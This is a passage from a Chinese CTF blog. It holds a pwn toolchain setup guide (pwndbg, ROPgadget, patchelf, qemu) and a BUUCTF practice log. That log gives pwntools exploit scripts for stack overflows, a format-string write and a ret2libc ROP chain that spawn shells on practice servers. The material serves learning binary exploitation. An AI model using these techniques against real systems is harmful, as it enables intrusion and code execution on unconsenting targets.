class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">功能</span><br><span class="line">libc : Print the base address of libc</span><br><span class="line">ld : Print the base address of ld</span><br><span class="line">codebase : Print the base of code segment</span><br><span class="line">heap : Print the base of heap</span><br><span class="line">got : Print the Global Offset Table infomation</span><br><span class="line">dyn : Print the Dynamic section infomation</span><br><span class="line">findcall : Find some function call</span><br><span class="line">bcall : Set the breakpoint at some function call</span><br><span class="line">tls : Print the thread local storage address</span><br><span class="line">at : Attach by process name</span><br><span class="line">findsyscall : Find the syscall</span><br><span class="line">fmtarg : Calculate the index of format string</span><br><span class="line">You need to stop on printf which has vulnerability.</span><br><span class="line">force : Calculate the nb in the house of force.</span><br><span class="line">heapinfo : Print some infomation of heap</span><br><span class="line">heapinfo (Address of arena)</span><br><span class="line">default is the arena of current thread</span><br><span class="line">If tcache is enable, it would show infomation of tcache entry</span><br><span class="line">heapinfoall : Print some infomation of heap (all threads)</span><br><span class="line">arenainfo : Print some infomation of all arena</span><br><span class="line">chunkinfo: Print the infomation of chunk</span><br><span class="line">chunkinfo (Address of victim)</span><br><span class="line">chunkptr : Print the infomation of chunk</span><br><span class="line">chunkptr (Address of user ptr)</span><br><span class="line">mergeinfo : Print the infomation of merge</span><br><span class="line">mergeinfo (Address of victim)</span><br><span class="line">printfastbin : Print some infomation of fastbin</span><br><span class="line">tracemalloc on : Trace the malloc and free and detect some error .</span><br><span class="line">You need to run the process first than tracemalloc on, it will record all of the malloc and free.</span><br><span class="line">You can set the DEBUG in pwngdb.py , than it will print all of the malloc and free infomation such as the screeshot.</span><br><span class="line">parseheap : Parse heap layout</span><br><span class="line">magic : Print useful variable and function in glibc</span><br><span class="line">fp : show FILE structure</span><br><span class="line">fp (Address of FILE)</span><br><span class="line">fpchain: show linked list of FILE</span><br><span class="line">orange : Test house of orange condition in the _IO_flush_lockp</span><br><span class="line">orange (Address of FILE)</span><br><span class="line">glibc version &lt;= 2.23</span><br></pre></td></tr></table></figure><p>pwndbg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh#建议挂魔法</span><br></pre></td></tr></table></figure><p>联合使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.gdbinit</span><br><span class="line">注释掉第一行 然后在第二行写入</span><br><span class="line">source ~/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure><h2 id="安装seccomp-tools"><a href="#安装seccomp-tools" class="headerlink" title="安装seccomp-tools"></a>安装seccomp-tools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><h2 id="安装one-gadget"><a href="#安装one-gadget" class="headerlink" title="安装one_gadget"></a>安装one_gadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="安装ROPgadget"><a href="#安装ROPgadget" class="headerlink" title="安装ROPgadget"></a>安装ROPgadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line"> </span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"> </span><br><span class="line">cd ROPgadget</span><br><span class="line"> </span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><h2 id="安装ropper"><a href="#安装ropper" class="headerlink" title="安装ropper"></a>安装ropper</h2><p><code>pip3 install capstone filebytes unicorn keystone-engine ropper</code></p><h2 id="安装LibcSearcher"><a href="#安装LibcSearcher" class="headerlink" title="安装LibcSearcher"></a>安装LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install LibcSearcher</span><br><span class="line">sudo pip3 install -U LibcSearcher</span><br></pre></td></tr></table></figure><h2 id="安装main-arena-offset"><a href="#安装main-arena-offset" class="headerlink" title="安装main_arena_offset"></a>安装main_arena_offset</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dev2ero/py_main_arena_offset.git</span><br><span class="line">cd py_main_arena_offset</span><br><span class="line">sudo python3 setup.py develop</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pymao import *</span><br><span class="line"></span><br><span class="line">libc = &quot;./libc.so.6&quot;</span><br><span class="line">main_arena_offset = gmao( libc )</span><br><span class="line">print(hex(main_arena_offset))</span><br></pre></td></tr></table></figure><h2 id="安装本地调试不同版本的libc环境"><a href="#安装本地调试不同版本的libc环境" class="headerlink" title="安装本地调试不同版本的libc环境"></a>安装本地调试不同版本的libc环境</h2><p><strong>glibc-all-in-one</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line">cd glibc-all-in-one</span><br><span class="line">python3 update_list</span><br><span class="line">cat list</span><br><span class="line"> ./download [libc-version]</span><br></pre></td></tr></table></figure><p><strong>patchelf</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 [your-libc-path] [yourelf]</span><br><span class="line">patchelf --set-interpreter [libc-ld-path] [elf]</span><br><span class="line">cp -r ~/Desktop/glibc-all-in-one/libs/[libcfolderpath]/.debug/ ./debug</span><br><span class="line">gdb [elf]</span><br></pre></td></tr></table></figure><h2 id="gdb-multiarch"><a href="#gdb-multiarch" class="headerlink" title="gdb-multiarch"></a>gdb-multiarch</h2><p><code>sudo apt-get install gdb-multiarch</code></p><p>用于调试异构程序</p><h2 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt-get install qemu</span><br><span class="line">sudo apt-get install qemu-user-static#可以不装</span><br><span class="line">sudo apt-get install qemu-system</span><br><span class="line">sudo apt-get install qemu-user</span><br></pre></td></tr></table></figure><p>另外提前安装一些常见的架构支持</p><p><code>sudo apt-get install libc6-arm64-cross libc6-armel-cross libc6-armhf-cross libc6-mips-cross libc6-mips32-mips64-cross libc6-mips32-mips64el-cross libc6-mips64-cross libc6-mips64-mips-cross libc6-mips64-mipsel-cross libc6-mips64el-cross libc6-mipsel-cross libc6-mipsn32-mips-cross libc6-mipsn32-mips64-cross libc6-mipsn32-mips64el-cross libc6-mipsn32-mipsel-cross</code></p><p>寻找其他架构支持:</p><p><code>apt-cache search &quot;libc6&quot; | grep $arch</code></p><p>搜索所需的架构就行，可以换成换成其他架构就行等</p><p><strong>调试:</strong></p><p>启动调试和运行程序的命令很相似，仅仅是加了一个参数-g 然后后面跟一个端口。</p><p>比如程序是动态链接的32位 arm架构的话，输入qemu-arm -g 1234 -L /usr/aarch64-linux-gnu ./程序名</p><p>这个1234是你指定的端口，指定别的端口也可以。然后参照运行程序那四个命令以及上面这个命令，就可以依次类推出调试aarch64架构的命令了。</p><p>此时再打开另一个终端，输入gdb-multiarch（<strong>必须是用pwndbg，如果是peda的话，是没法正常调试的</strong>）</p><p>然后再输入target remote localhost:1234 连接到刚才开的那个端口。</p><p>当然直接用pwntools也行</p><p>比较新的pwndbg可能无法使用vmmap命令,等作者修复吧</p><h2 id="binutils"><a href="#binutils" class="headerlink" title="binutils"></a>binutils</h2><p><code>apt-cache search &quot;binutils&quot; | grep $arch</code></p><p>搜索需要的安装</p><h2 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h2><p>buildroot构建异构调试环境</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题记录</title>
      <link href="/posts/13868/"/>
      <url>/posts/13868/</url>
      
        <content type="html"><![CDATA[<h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>入门题，防护全关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote() <span class="comment">#不固定就不写了</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x40118a</span>)) <span class="comment">#其实都比较建议跳过开头的开辟栈帧操作,要不然总是遇到一些奇奇怪怪的问题①</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>吃的大亏,现在才知道<strong>有些题目虽然有输出信息,但远程recv()是收不到东西会卡住的</strong></p><details class="folding-tag" yellow><summary> ① </summary>              <div class='content'>              <p>在一些比较新的环境下,如果覆盖返回地址的开头的操作为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br></pre></td></tr></table></figure><p>程序就会崩溃</p><p>至于原因,就是调用system时,栈没有对齐,如果不push rbp则对齐,故选择跳过</p><p>因此视情况跳过这两句代码</p>              </div>            </details><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>和上一题基本没有区别</p><p>只不过最后不是给shell权限而是直接cat flag罢了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(<span class="number">0x40060d</span>))</span><br><span class="line">p.interactive() <span class="comment">#虽然不是拿到shell但回到shell模式也能直接获得输出</span></span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>保护只开了nx</p><p>ida查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个思路</p><ol><li>直接溢出返回地址到cat /flag指令处</li><li>溢出修改v2,这个比较值是字面值可以在.rodata中找到</li></ol><p><strong>exp1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28933</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(<span class="number">0x4006BE</span>)) <span class="comment">#一开始好几次没成功,以为不行,结果是我打包成p32了</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>exp2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span></span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">44</span>+p32(<span class="number">0x41348000</span>))<span class="comment">#这里就要p32了float是四字节,其实p64也行只不过会覆盖到返回地址</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>保护只开nx</p><p>ida查看</p><p>发现是c++代码,我这半桶水读起来有点吃力</p><p>直接运行看看,发现输入I会被替换为you,这样一个I能填充三个字节就可以做到溢出的效果了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x08048F10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>读一读源码</p><ol><li><p>fgets(s, 32, edata) ,edata其实也就是stdin了</p></li><li><p>使用 <code>std::string::operator=</code> 将 <code>s</code> 中的内容赋值给名为 <code>input</code> 的 <code>std::string</code> 对象。</p></li><li>使用 <code>std::allocator&lt;char&gt;::allocator</code> 创建了一个 <code>std::allocator&lt;char&gt;</code> 对象，并将其地址传递给 <code>v5</code> 变量。</li><li>使用 <code>std::string::string</code> 构造了一个 <code>std::string</code> 对象 <code>v4</code>，其中包含字符串 “you”。</li><li>使用 <code>std::allocator&lt;char&gt;::allocator</code> 创建了另一个 <code>std::allocator&lt;char&gt;</code> 对象，并将其地址传递给 <code>v7</code> 变量。</li><li>使用 <code>std::string::string</code> 构造了另一个 <code>std::string</code> 对象 <code>v6</code>，其中包含字符串 “I”。</li><li>调用 <code>replace()</code> 函数，将 <code>input</code> 对象中的子字符串 “I” 替换为字符串 “you”.</li><li>使用 <code>std::string::operator=</code> 将 <code>v3</code> 变量中的字符串内容赋值给 <code>input</code> 对象，并在 <code>v6</code> 和 <code>v4</code> 的帮助下构造了一个新的字符串。</li><li>调用 <code>std::string</code> 和 <code>std::allocator</code> 的析构函数来释放已分配的内存。</li><li>将 <code>input</code> 中的字符串复制到 <code>s</code> 变量中。</li><li>使用 <code>printf()</code> 函数打印最终结果</li></ol><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>没什么好说的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x40059A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p>保护查一查，开启了nx与canary</p><p>ida看一看，确定为格式化字符串漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-24_210019.png" alt=""></p><p>第一想法是dword_804c044有出现在参数中,那么栈中能找到能找到它,可以泄露其中的数据,再输入以通过</p><p>不过gdb调试发现read后的栈中它的地址已经被覆盖了,</p><p>那就只能选择任意地址写了</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-24_210719.png" alt=""></p><p><strong>格式化字符串是第一个参数</strong>,那么输入内容的相对偏移是10</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;%12$nxxx&#x27;</span>+p32(<span class="number">0x804C044</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护,只开了nx</p><p>ida反汇编,程序为一个菜单式程序</p><p>没有system函数和/bin/sh字符串</p><p>基本确定为libc泄露类题</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-24_212742.png" alt=""></p><p>危险函数如上</p><p>这个循环会修改我们的输入但是有可以跳过的办法,即v0一定是一个大于零的数,则只要payload开头为<strong>\x00</strong>就行了</p><p><strong>exp</strong>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">e=ELF(<span class="string">&#x27;./12&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_addr=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">padding=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span> <span class="comment">#这里脑抽，0x50换算成了十进制，填的时候又加了0x，被报错折磨了半个小时才发现，我好菜</span></span><br><span class="line">p.sendline(padding+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)   <span class="comment">#puts自带换行</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#64位函数真实地址一般只占6个字节，且最高位为&#x27;\x7f&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  <span class="comment">#可以选择用Lincsearcher来直接pwntools中操作，但我还是选择用libcdatabase这个网站查询获得地址</span></span><br><span class="line">libc_base=puts_addr-<span class="number">0x0809c0</span></span><br><span class="line">system=libc_base+<span class="number">0x04f440</span></span><br><span class="line">binsh=libc_base+<span class="number">0x1b3e9a</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(padding+p64(rdi_addr)+p64(binsh)+p64(ret)+p64(system)) <span class="comment">#这里有个栈对齐，下面说一说</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" cyan><summary> pwntools中ELF获取plt </summary>              <div class='content'>              <p>即ELF.symbol,ELF.plt,ELF.got的使用区分</p><p>ELF.plt得到的是plt的地址,ELF.plt的内容首项是跳转到ELF.got中存储地址,ELF.got的内容是函数的真实加载地址</p><p>当需要访问函数的真实加载地址就需要访问ELF.got内容,但动态链接下,初始ELF.got项必然不是函数真实地址,且访问ELF.got又需要访问ELF.plt</p><p><strong>另外ELF.plt一定能进入函数,ELF.got则不一定(未初始化)</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-25_211747.png" alt=""></p><p>使用哪个,则要看需要访问的内容,要实现什么目的</p><p>再来看symbols和plt的使用场合</p><p>这两个很多时候返回是相同的(差不多可以当作一个用了,像这题,puts_plt=e.symbols[‘puts’也是可以的])</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ELF.symbols适用场景：</span><br><span class="line">查找特定符号的地址，例如函数的入口地址、全局变量的地址等。</span><br><span class="line">枚举可执行文件中的所有符号，例如枚举所有导出函数。优先考虑PLT条目，而不是GOT条目。</span><br><span class="line">ELF.plt适用场景：</span><br><span class="line">查找需要动态链接的函数的入口地址，例如为调用某个函数进行ROP攻击时。</span><br><span class="line">枚举需要动态链接的函数，例如枚举可执行文件依赖的所有共享库中的导出函数。</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" yellow><summary> 因为不严谨导致问题的细节 </summary>              <div class='content'>              <p>其实就是一些小细节</p><ol><li>send和sendline的使用,大多数时候二者没有差别,但是诸如遇到了getchar(),gets()这些函数,就只能用sendline(或者send自己加\n)了,因为这两个函数不接收到\n就不会继续执行,导致程序的执行卡住,不能往下执行</li><li>puts函数输出时会自带\n,接收时要注意</li></ol>              </div>            </details><details class="folding-tag" green><summary> 栈对齐 </summary>              <div class='content'>              <p>距离shell临门一脚的坑</p><p>ubuntu18(glibc2.27)后64位下</p><p>system函数执行过程中会有这么一条指令</p><p><code>movaps xmmword ptr [rsp + 0x??], xmm0</code></p><p>故而就要求在运行到该处时.rsp要是16的整数倍,</p><p>又由于程序指令的相对不变性,所以需要对<strong>system函数地址在栈中的存放地址有要求</strong></p><p>一般来说都是要使得<strong>system函数地址在栈中的存放地址要是16的整数倍</strong>(不一定),即能达到上述目的</p><p>除system外,printf等函数也会有这种指令,也就是上面提到的跳过栈帧开辟</p>              </div>            </details><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>ida一看,就是对一个数组进行输入,第14个元素如果等于17则拿到shell</p><p>唯一值得注意的就是</p><p><code>if ( *(_QWORD *)&amp;var[13] )</code>将dword指针变为了qword指针,所以第15个元素得留空,不过以防之前栈中存留了一些数据,也可以用p64打包直接覆盖</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26449</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(<span class="number">0x0</span>)*<span class="number">13</span>+p64(<span class="number">0x11</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>好几次遇到了同一个问题,进入shell模式后,第一条指令永远没有输出,虽然无伤大雅,且并不是每题都这样,但强迫症很难受啊</p><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p>保护只开了nx</p><p>ida查看有system函数,而且能找到到binsh字符串</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.recv()</span><br><span class="line">system=<span class="number">0x0804845C</span></span><br><span class="line">binsh=<span class="number">0x0804A024</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">140</span>+p32(system)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>常规入门题</p><p>只不过read字符数由自己输入</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line">p.recv()</span><br><span class="line">backdoor=<span class="number">0x4006EA</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" 